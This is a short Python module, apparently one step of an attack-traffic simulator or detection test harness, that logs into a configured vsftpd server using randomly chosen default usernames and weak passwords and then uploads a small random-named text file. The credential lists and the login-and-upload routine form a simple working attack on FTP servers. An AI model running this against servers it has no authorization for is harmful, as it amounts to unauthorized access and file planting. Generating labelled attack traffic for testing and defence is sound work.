"""FTP upload against vsftpd: log in with a seeded credential and STOR a tiny in-memory file."""
import ftplib
import io
import string

ATTACK_TYPE = "ftp_upload"
DEFAULT_RATE = 0.5

USERS = ["ftp", "anonymous", "admin", "test", "user", "uploader", "guest"]
PASSWORDS = ["ftp", "password", "admin", "123456", "anonymous", "changeme", "welcome1", "secret"]


def step(ctx):
    host, port = ctx.targets["ftp"]
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=ctx.timeout)
        ftp.login(ctx.rng.choice(USERS), ctx.rng.choice(PASSWORDS))
        name = "".join(ctx.rng.choice(string.ascii_lowercase) for _ in range(8)) + ".txt"
        ftp.storbinary(f"STOR {name}", io.BytesIO(b"test\n"))
    finally:
        try:
            ftp.quit()
        except Exception:
            ftp.close()
